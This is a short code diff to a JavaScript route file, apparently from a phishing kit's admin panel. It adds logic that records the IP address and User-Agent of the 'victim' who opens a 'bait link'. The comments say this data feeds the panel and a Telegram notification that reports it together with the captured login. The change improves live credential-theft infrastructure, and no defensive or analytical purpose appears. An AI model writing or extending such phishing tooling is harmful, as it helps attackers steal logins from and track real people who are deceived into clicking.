@@ -291,11 +291,20 @@ export default async function panelRoutes(app) {
     reply.raw.end();
   });
 
-  // Start session by ref, return accountId (used by view.js)
+  // Start session by ref, return accountId (used by view.js).
+  // This is where the VICTIM arrives via the shared link — record THEIR
+  // IP and User-Agent (not the admin's) so the panel can show who
+  // actually opened the bait link, and the Telegram notification can
+  // report it with the login.
   app.post('/api/account-by-ref/:ref/start', async (req, reply) => {
     if (checkPin(req, reply) === false) return;
     const acc = await getAccountByRef(req.params.ref);
     if (!acc) return reply.code(404).send({ error: 'unknown_ref' });
+    const victimIp = req.ip;
+    const victimUa = req.headers['user-agent'] || '';
+    if (!acc.victimIp || !acc.victimUa) {
+      await saveAccount({ ...acc, victimIp, victimUa, victimFirstSeen: Date.now() });
+    }
     await browser.start(acc.id, req.ip);
     return { accountId: acc.id };
   });
